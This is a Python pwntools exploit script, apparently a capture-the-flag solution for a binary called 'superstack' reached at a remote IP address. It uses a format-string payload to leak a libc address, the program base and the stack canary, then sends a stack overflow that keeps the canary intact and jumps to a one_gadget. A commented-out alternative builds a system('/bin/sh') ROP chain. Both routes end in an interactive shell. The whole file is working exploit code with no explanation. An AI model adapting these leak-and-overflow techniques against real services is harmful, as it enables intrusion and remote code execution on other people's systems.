from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
p = remote("121.43.169.147","8735")

#p = process("./superstack")
#gdb.attach(p)
gedget = [0x45216 ,0x4526a,0xf02a4,0xf1147]

libc = ELF("./libc-2.23.so")

payload = "niyah%19$p,%18$lx,%17$p"

p.sendafter("tell me you name: ",payload)
p.sendafter(" name","ga")

#pause()
p.recvuntil("niyah")

leak = int(p.recv(14),16) - 240
p.recvuntil(",")

main_off  = int(p.recv(12),16) - 0xb50
p.recvuntil(",")

canary = int(p.recv(len("0x4bbf1e730bf47000")),16)
log.info(str(hex(leak))+"---"+str(hex(canary))+"---" + str(hex(main_off)))

libc_base = leak - libc.sym["__libc_start_main"]

p_rdi_ret = 0x0000000000000bb3 + main_off

system = libc.sym["system"] + libc_base
binsh = libc.search("/bin/sh").next() +libc_base
shell = libc_base + gedget[0]

payload = "yes\n".ljust(0x18,"\x00") + p64(canary) + "aaaaaaaa"+ p64(shell)

#payload = "yes\n".ljust(0x18,"\x00") + p64(canary) + "aaaaaaaa"+p64(p_rdi_ret) + p64(binsh) + p64(system) 

p.sendlineafter("girlfirend",payload)

p.interactive()